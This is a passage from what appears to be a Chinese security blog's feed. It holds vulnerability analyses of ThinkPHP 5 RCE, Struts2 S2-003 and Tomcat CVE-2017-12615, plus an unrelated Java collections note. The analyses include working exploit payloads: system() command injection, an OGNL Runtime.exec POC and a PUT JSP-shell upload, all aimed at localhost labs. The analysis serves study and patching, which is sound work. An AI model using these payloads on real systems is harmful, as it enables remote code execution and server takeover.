alt=""></p><p>而在<strong>method</strong>方法中如果<code>true === $method</code>，就会调用原始请求<code>server(&#39;REQUEST_METHOD&#39;)</code>，跟进<strong>server</strong>这一函数</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0jszunj7qj31qc0ju43s.jpg" alt=""></p><p>看到最后会经过<code>$this-&gt;input()</code>处理，继续跟进<strong>input</strong>函数</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0jt3w133oj315f0u0gue.jpg" alt=""></p><p>在第1023行，可以看到使用解析过滤器<code>$this-&gt;getFilter</code>，跟进这一函数</p><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0jt61zq98j31ao0hu0w1.jpg" alt=""></p><p>在第1058行，<code>$filter</code>会直接赋值<code>$this-&gt;filter</code>，并将结果返回</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0jtqnqatfj31di0i0jve.jpg" alt=""></p><p>查看<code>filterValue</code>函数</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0jts1pvpnj31ad0u07ef.jpg" alt=""></p><p>在第1083行，可以看到<code>call_user_func</code>函数，其中<strong>$filter</strong>和<strong>$value</strong>都是可控的，那么我们直接命令执行</p><h2 id="6、漏洞复现"><a href="#6、漏洞复现" class="headerlink" title="6、漏洞复现"></a>6、漏洞复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/public/index.php?s=captcha</span><br><span class="line">POST:</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ifconfig</span><br></pre></td></tr></table></figure><p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0ju3812zyj31hr0u016a.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/public/index.php?s=captcha</span><br><span class="line">POST:</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0ju6qpmjhj31hz0u0afv.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()</span><br></pre></td></tr></table></figure><p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0ju8dys44j31g60u0qg1.jpg" alt=""></p><h2 id="7、漏洞修复"><a href="#7、漏洞修复" class="headerlink" title="7、漏洞修复"></a>7、漏洞修复</h2><p>增加对$method的白名单，不允许任意调用函数</p><p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0juky7gijj322n0u0tkq.jpg" alt=""></p><h2 id="8、参考链接"><a href="#8、参考链接" class="headerlink" title="8、参考链接"></a>8、参考链接</h2><ul><li><p><a href="https://paper.seebug.org/787/#_5" target="_blank" rel="noopener">https://paper.seebug.org/787/#_5</a></p></li><li><p><a href="http://www.lmxspace.com/2019/01/13/ThinkPHP-request%E5%87%BD%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/01/13/ThinkPHP-request%E5%87%BD%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a></p></li><li><p><a href="https://chybeta.github.io/2019/01/13/ThinkPHP-5-0-0-5-0-23-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://chybeta.github.io/2019/01/13/ThinkPHP-5-0-0-5-0-23-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p></li></ul>]]></content>
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> 远程代码执行漏洞 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JAVA高级类使用技巧</title>
      <link href="/JAVA%E9%AB%98%E7%BA%A7%E7%B1%BB%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
      <url>/JAVA%E9%AB%98%E7%BA%A7%E7%B1%BB%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><p><script type="text/javascript" src="/js/src/bai.js"></script></p><h2 id="1、高级类定义"><a href="#1、高级类定义" class="headerlink" title="1、高级类定义"></a>1、高级类定义</h2><p>&ensp;&ensp;&ensp;非专用对象，比如像IO操作、多线程操作、网络编程、GUI操作等等，都有专门作用的API，或者想打印机都属于专用API。除此之谓的公共性质的对象，称之为高级对象<br>&ensp;&ensp;&ensp;比如：字符串操作、正则表达式、集合类、日期处理、数值处理等等，都算高级类应用</p><h2 id="2、字符串"><a href="#2、字符串" class="headerlink" title="2、字符串"></a>2、字符串</h2><ul><li>String：不可变序列</li><li>StringBuilder：可变序列，线程不安全</li><li>StringBuffer：可变序列，线程安全</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">StringBuffer str = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        str.append(<span class="string">"1234"</span>);</span><br></pre></td></tr></table></figure><h2 id="3、Set-HashSet-TreeSet"><a href="#3、Set-HashSet-TreeSet" class="headerlink" title="3、Set,HashSet,TreeSet"></a>3、Set,HashSet,TreeSet</h2><ul><li>特点：不按add顺序、不可重复</li><li>不可重复的判断标准：hashcode相等，并且equals相等。<br>   hashcode对hash结构的数据存储的性能影响巨大。</li><li>TreeSet:是按加入值的自然序排序，当然你可以实现comparator接口来实现自定义排序。</li><li>HashSet底层是数组结构，借助Hashmap来实现。TreeSet底层是链表结构，它是借助TreeMap.</li><li>Set本质就是一个value=null或者是不变值的map。<br>（以上两者均是线程不安全）</li></ul><h2 id="4、List-ArrayList-LinkedList及Vector"><a href="#4、List-ArrayList-LinkedList及Vector" class="headerlink" title="4、List,ArrayList,LinkedList及Vector"></a>4、List,ArrayList,LinkedList及Vector</h2><ul><li>List的特点：加入有序、可重复。</li><li>可重复的判定标准：是否equals为唯一判断标准</li><li>ArrayList:底层是数组，遍历快、随机按下标访问快，但是删除元素肯定是慢的。</li><li>LinkedList：底层是链表，删除快，但遍历慢。</li><li>Vector: arrayList的前身，主要区别在于它是线程安全的。<br>  ArrayList和LinkedList都是线程不安全的。</li></ul><h2 id="5、Map-HashMap及HashTable"><a href="#5、Map-HashMap及HashTable" class="headerlink" title="5、Map,HashMap及HashTable"></a>5、Map,HashMap及HashTable</h2><ul><li>Map的特点：键值对形式。</li><li>HashMap的底层是数组，TreeMap的底层是链表。</li><li>HashTable：是线程安全的HashMap。</li></ul><hr><h2 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h2><p><code>内存泄露</code>：程序运行过程中，出现了不可被回收，但又永久占空间的内存地址。以HashSet为例，底层为数组。</p><p><code>线程安全</code>：线程安全和不安全的唯一判别标准：在访问对象内部有没有可能被两个线程同时访问的非局部变量。像ArrayList,LinkedList,HashSet，HashTable，HashMap等等</p><p><code>性能</code>:<br>1、当字符串频繁变化长度时，应用StringBuilder或StringBuffer<br>2、关于集合类，能用数组不要用集合，能用Set就不要用Map</p>]]></content>
      
      <categories>
          
          <category> 编程学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2-003远程代码执行漏洞分析</title>
      <link href="/Struts2-003%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/Struts2-003%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><p><script type="text/javascript" src="/js/src/bai.js"></script></p><h2 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1.漏洞信息"></a>1.漏洞信息</h2><p><strong>官方链接</strong>：<a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-003</a></p><p><strong>官方概述</strong>：XWork ParameterInterceptors bypass allows OGNL statement execution</p><p><strong>影响版本</strong>：Struts 2.0.0 - Struts 2.0.11.2</p><p><strong>修复摘要</strong>：Developers should immediately upgrade to Struts 2.0.12 or upgrade to XWork 2.0.6</p><h2 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2.漏洞原理"></a>2.漏洞原理</h2><p>Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过<code>#</code>来访问struts的对象，Struts2框架虽然过滤了<code>#</code>来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果</p><h2 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3.环境搭建"></a>3.环境搭建</h2><p><strong>下载 Struts2.0.11.2</strong>：<a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.11.2-all.zip" target="_blank" rel="noopener">http://archive.apache.org/dist/struts/binaries/struts-2.0.11.2-all.zip</a></p><h3 id="3-1-目录结构"><a href="#3-1-目录结构" class="headerlink" title="3.1 目录结构"></a>3.1 <strong>目录结构</strong></h3><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fuezr5mglpj30h20lm0v5.jpg" alt=""></p><h3 id="3-2-引用的包"><a href="#3-2-引用的包" class="headerlink" title="3.2 引用的包"></a>3.2 <strong>引用的包</strong></h3><ul><li>commons-logging-1.0.4.jar</li><li>freemarker-2.3.8.jar</li><li>ognl-2.6.11.jar</li><li>struts2-core-2.0.11.2.jar</li><li>xwork-2.0.5.jar</li></ul><h3 id="3-3-相关文件"><a href="#3-3-相关文件" class="headerlink" title="3.3 相关文件"></a>3.3 <strong>相关文件</strong></h3><p><strong>index.jsp</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">    pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;S2-003&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-003 Demo&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;link: &lt;a href=<span class="string">"https://cwiki.apache.org/confluence/display/WW/S2-003"</span>&gt;https:<span class="comment">//cwiki.apache.org/confluence/display/WW/S2-003&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line">&lt;s:form action=<span class="string">"login"</span>&gt;</span><br><span class="line">&lt;s:textfield name=<span class="string">"username"</span> label=<span class="string">"username"</span> /&gt;</span><br><span class="line">&lt;s:textfield name=<span class="string">"password"</span> label=<span class="string">"password"</span> /&gt;</span><br><span class="line">&lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><strong>welcome.jsp</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">    pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><strong>struts.xml</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE struts PUBLIC</span><br><span class="line">    <span class="string">"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span><br><span class="line">    <span class="string">"http://struts.apache.org/dtds/struts-2.0.dtd"</span>&gt;</span><br><span class="line">&lt;struts&gt;</span><br><span class="line">&lt;<span class="keyword">package</span> name=<span class="string">"S2-003"</span> extends=<span class="string">"struts-default"</span>&gt;</span><br><span class="line">&lt;action name=<span class="string">"login"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"com.demo.action.LoginAction"</span>&gt;</span><br><span class="line">&lt;result name="success"&gt;welcome.jsp&lt;/result&gt;</span><br><span class="line">&lt;result name="error"&gt;index.jsp&lt;/result&gt;</span><br><span class="line">&lt;/action&gt;</span><br><span class="line">&lt;/package&gt;</span><br><span class="line">&lt;/struts&gt;</span><br></pre></td></tr></table></figure></p><p><strong>com.demo.action.LoginAction.java</strong><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> String username = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">private</span> String password = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.username = username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.password = password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</span><br><span class="line">&amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>web.xml</strong><br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;web-app xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> xmlns=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span> xsi:schemaLocation=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span> id=<span class="string">"WebApp_ID"</span> version=<span class="string">"3.1"</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;display-name&gt;S2-003 Example&lt;/display-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-<span class="class"><span class="keyword">class</span>&gt;<span class="title">org</span>.<span class="title">apache</span>.<span class="title">struts2</span>.<span class="title">dispatcher</span>.<span class="title">FilterDispatcher</span>&lt;/<span class="title">filter</span>-<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">filter</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">filter</span>-<span class="title">name</span>&gt;<span class="title">struts2</span>&lt;/<span class="title">filter</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">url</span>-<span class="title">pattern</span>&gt;/*&lt;/<span class="title">url</span>-<span class="title">pattern</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">welcome</span>-<span class="title">file</span>-<span class="title">list</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">welcome</span>-<span class="title">file</span>&gt;<span class="title">index</span>.<span class="title">jsp</span>&lt;/<span class="title">welcome</span>-<span class="title">file</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">welcome</span>-<span class="title">file</span>-<span class="title">list</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">web</span>-<span class="title">app</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h2><p>这里需要提示一下，一定要在<a href="https://archive.apache.org/dist/tomcat/tomcat-6/v6.0.20/bin/apache-tomcat-6.0.20.zip" target="_blank" rel="noopener">Tomcat6</a>下测试。Tomcat7及以上版本传入特殊版本会报错，如下图所示</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fueygklilvj31kw08541t.jpg" alt=""></p><p>在动态调试之前，首先要先了解下OGNL表达式中三个符号(%，#，$)的一些含义</p><ul><li><code>%</code>的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值</li><li><code>#</code>的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用</li><li><code>$</code>主要是在Struts 2配置文件中，引用OGNL表达式</li></ul><p>我们和001调试的位置一样，在<code>setParameters</code>处打断点</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fuf1c3nejzj31kw0d7afb.jpg" alt=""></p><p>跟进<code>xwork-2.0.5.jar!com/opensymphony/xwork2/interceptor/ParametersInterceptor</code></p><p>这里获取到传入的值，赋值到<code>acceptableName</code><br><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fuf435qhg4j31kw0fn420.jpg" alt=""></p><p>跟进<code>acceptableName</code></p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fuf440obzcj31kw03gwfq.jpg" alt=""></p><p>继续跟进<code>isAccepted(name)</code>，这里主要是检测我们的参数名中是否包含<code>=</code> <code>,</code> <code>#</code> <code>:</code>，来防止传入恶意特殊字符开头如#等。如果参数名匹配到这几个字符，<code>acceptableName</code>就会返回false，下面的ognl表达式就不会执行。</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fuf4558b7tj31kw0snqhj.jpg" alt=""></p><p>所以我们构造payload时，使用unicode为<code>\u0023</code>来代替<code>#</code>，来绕过匹配的内容，这样<code>acceptableName</code>就会返回true，从而进一步执行。</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fuf475gw0dj31kw0n47h0.jpg" alt=""></p><p>跟进<code>xwork-2.0.5.jar!com/opensymphony/xwork2/util/OgnlValueStack.class</code>进入到<strong>setValue</strong>方法</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fuf4c2uw4lj31kq03aq47.jpg" alt=""></p><p>继续跟进，可以看到expr的内容传入到OgnlUtil.setValue()中</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fuf4dng30dj31kw0jnn23.jpg" alt=""></p><p>跟进<code>xwork-2.0.5.jar!com/opensymphony/xwork2/util/OgnlUtil.class</code>,可以看到最终payload包含的<code>#</code>,经过unicode编码绕过后,赋值给o，最终作为OGNL表达式来执行</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fuf4lo5cs4j31k80e441x.jpg" alt=""></p><h2 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h2><p><strong>POC：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?(<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla)(bla)&amp;(<span class="string">'\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET'</span>)(kxlzx)(kxlzx)&amp;(<span class="string">'\u0023mycmd\u003d\'ifconfig\''</span>)(bla)(bla)&amp;(<span class="string">'\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)'</span>)(bla)(bla)&amp;(A)((<span class="string">'\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())'</span>)(bla))&amp;(B)((<span class="string">'\u0023myres\u003dnew\40byte[51020]'</span>)(bla))&amp;(C)((<span class="string">'\u0023mydat.readFully(\u0023myres)'</span>)(bla))&amp;(D)((<span class="string">'\u0023mystr\u003dnew\40java.lang.String(\u0023myres)'</span>)(bla))&amp;(<span class="string">'\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()'</span>)(bla)(bla)&amp;(E)((<span class="string">'\u0023myout.getWriter().println(\u0023mystr)'</span>)(bla))</span><br></pre></td></tr></table></figure><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fuey79waguj31kw0t3qjc.jpg" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-003</a></li><li><a href="https://xz.aliyun.com/t/2323" target="_blank" rel="noopener">https://xz.aliyun.com/t/2323</a></li><li><a href="https://03i0.com/2018/04/08/S2-003%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://03i0.com/2018/04/08/S2-003%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</a></li></ul>]]></content>
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> 远程代码执行漏洞 </tag>
            
            <tag> Struts2-003 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Apache Tomcat 远程代码执行漏洞复现（CVE-2017-12615）</title>
      <link href="/Apache-Tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2017-12615%EF%BC%89/"/>
      <url>/Apache-Tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2017-12615%EF%BC%89/</url>
      <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1. 漏洞信息"></a>1. 漏洞信息</h2><p>漏洞编号：CVE-2017-12615</p><p>漏洞名称：CVE-2017-12615-远程代码执行漏洞</p><p>影响版本：Apache Tomcat 7.0.0 - 7.0.81</p><p>漏洞描述：</p><p>  当 Tomcat运行在Windows操作系统时，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。</p><p>测试平台：Windows</p><p>测试环境：Tomcat 7.0.72</p><h2 id="2-漏洞验证"><a href="#2-漏洞验证" class="headerlink" title="2. 漏洞验证"></a>2. 漏洞验证</h2><h3 id="2-1-安装Tomcat"><a href="#2-1-安装Tomcat" class="headerlink" title="2.1 安装Tomcat"></a>2.1 安装Tomcat</h3><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fw93ipazscj31fv0e977l.jpg" alt=""></p><h3 id="2-2-初始化参数"><a href="#2-2-初始化参数" class="headerlink" title="2.2 初始化参数"></a>2.2 初始化参数</h3><p>修改Tomcat 7.0/conf/web.xml文件，添加readonly属性，将 readonly 初始化参数由默认值设置为 false，重启Tomcat，经过实际测试，Tomcat 7.x版本内web.xml配置文件内默认配置无readonly参数，需要手工添加，默认配置条件下不受此漏洞影响。</p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fw93jk6n7xj313a0d641m.jpg" alt=""></p><h3 id="2-3-任意文件上传"><a href="#2-3-任意文件上传" class="headerlink" title="2.3 任意文件上传"></a>2.3 任意文件上传</h3><p><strong> payload1：</strong></p><blockquote><p>PUT /111.jsp::$DATA HTTP/1.1<br>Host: 127.0.0.1:8080<br>User-Agent: JNTASS<br>DNT: 1<br>Connection: close<br>…jsp shell…</p></blockquote><p><img 